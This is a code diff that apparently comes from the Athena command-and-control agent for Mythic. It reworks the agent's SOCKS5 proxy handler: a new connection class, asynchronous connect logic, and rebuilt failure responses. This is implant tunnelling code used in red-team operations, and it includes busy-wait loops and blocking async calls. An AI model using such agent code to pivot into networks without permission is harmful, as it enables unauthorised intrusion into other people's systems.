@@ -13,7 +13,7 @@ namespace Athena.Commands.Model
     public class SocksHandler
     {
         private CancellationTokenSource ct { get; set; }
-        private ConcurrentDictionary<int, SocksConnection> connections { get; set; }
+        private ConcurrentDictionary<int, AthenaSocksConnection> connections { get; set; }
         private ConcurrentBag<SocksMessage> messagesOut = new ConcurrentBag<SocksMessage>();
         public bool running { get; set; }
 
@@ -21,7 +21,7 @@ namespace Athena.Commands.Model
         {
             this.running = false;
             //this.connections = new Dictionary<int, SocksConnection>();
-            this.connections = new ConcurrentDictionary<int, SocksConnection>();
+            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
         }
 
         /// <summary>
@@ -31,7 +31,7 @@ namespace Athena.Commands.Model
         {
             this.ct = new CancellationTokenSource();
             //this.connections = new Dictionary<int, SocksConnection>();
-            this.connections = new ConcurrentDictionary<int, SocksConnection>();
+            this.connections = new ConcurrentDictionary<int, AthenaSocksConnection>();
             this.messagesOut = new ConcurrentBag<SocksMessage>();
 
             return true;
@@ -70,7 +70,7 @@ namespace Athena.Commands.Model
         /// Add a connection to the tracker dictionary
         /// </summary>
         /// <param name="conn">Socks Connection</param>
-        public async Task<bool> AddConnection(SocksConnection conn)
+        public async Task<bool> AddConnection(AthenaSocksConnection conn)
         {
             this.connections.GetOrAdd(conn.server_id, conn);
             return true;
@@ -84,7 +84,7 @@ namespace Athena.Commands.Model
         {
             try
             {
-                this.connections.Remove(conn, out _);
+                this.connections.TryRemove(conn, out _);
             }
             catch
             {
@@ -119,7 +119,18 @@ namespace Athena.Commands.Model
         {
             if (this.connections.ContainsKey(sm.server_id))
             {
+                AthenaSocksConnection conn = this.connections[sm.server_id];
 
+                while (conn.IsConnecting) { }; //packet arrived before it was finished connecting
+
+                if (conn.IsConnected)
+                {
+                    conn.SendAsync(await Misc.Base64DecodeToByteArrayAsync(sm.data));
+                }
+                else
+                {
+                    await RemoveConnection(conn.server_id);
+                }
             }
             else
             {
@@ -142,20 +153,10 @@ namespace Athena.Commands.Model
                 }
 
                 ConnectionOptions co = new ConnectionOptions(sm); //Create new ConnectionOptions
-                SocksConnection sc = new SocksConnection(co); //Create Socks Connection Object
-                
-                //Set our events
-                sc.client.OnDataReceived += sc.OnReceived;
-                sc.client.OnDisconnected += sc.OnDisconnect;
+                AthenaSocksConnection sc = new AthenaSocksConnection(co); //Create Socks Connection Object
 
 
                 await AddConnection(sc); //Add our connection to the Dictionary
-
-                ConnectResponse cr = new ConnectResponse() //Put together the Socks5 Connection Request
-                {
-                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
-                    bndport = new byte[] { 0x00, 0x00 },
-                };
 
                 SocksMessage smOut = new SocksMessage() //Put together our Mythic Response
                 {
@@ -164,38 +165,49 @@ namespace Athena.Commands.Model
 
                 try
                 {
-                    await sc.client.ConnectAsync(co.ip, co.port);
-                    
-                    if (!sc.client.IsReceiving)
+                    sc.ConnectAsync();
+                    Task.Run(() =>
                     {
-                        sc.client.Receive(sc.ct.Token);
-                    }
+                        while (sc.IsConnecting) { };
 
-                    if (!sc.client.IsConnected)
-                    {
-                        cr.status = ConnectResponseStatus.GeneralFailure;
-                        smOut.exit = true;
-                        RemoveConnection(sm.server_id);
-                    }
+                        if (!sc.IsConnected)
+                        {
+                            smOut = new SocksMessage() //Put together our Mythic Response
+                            {
+                                server_id = sc.server_id,
+                                data = Misc.Base64Encode(new ConnectResponse
+                                {
+                                    bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                                    bndport = new byte[] { 0x00, 0x00 },
+                                    addrtype = co.addressType,
+                                    status = ConnectResponseStatus.GeneralFailure,
 
-                    cr.addrtype = co.addressType;
-
-                    //Put our ConnectResponse into the SocksMessage
-                    smOut.data = await Misc.Base64Encode(cr.ToByte());
+                                }.ToByte()).Result,
+                            };
+                            ReturnMessage(smOut);
+                        }
+                    });
                 }
                 catch
                 {
-                    cr.status = ConnectResponseStatus.GeneralFailure;
-                    smOut.exit = true;
-                    RemoveConnection(sm.server_id);
+                    smOut = new SocksMessage() //Put together our Mythic Response
+                    {
+                        server_id = sc.server_id,
+                        data = Misc.Base64Encode(new ConnectResponse
+                        {
+                            bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
+                            bndport = new byte[] { 0x00, 0x00 },
+                            addrtype = co.addressType,
+                            status = ConnectResponseStatus.GeneralFailure
+
+                        }.ToByte()).Result,
+                    };
+                    ReturnMessage(smOut);
                 }
-                //Return message
-                ReturnMessage(smOut);
+
             }
             catch (Exception e)
             {
-                Console.WriteLine("[HandleNew]");
-                Console.WriteLine(e);
                 ConnectResponse cr = new ConnectResponse()
                 {
                     bndaddr = new byte[] { 0x01, 0x00, 0x00, 0x7F },
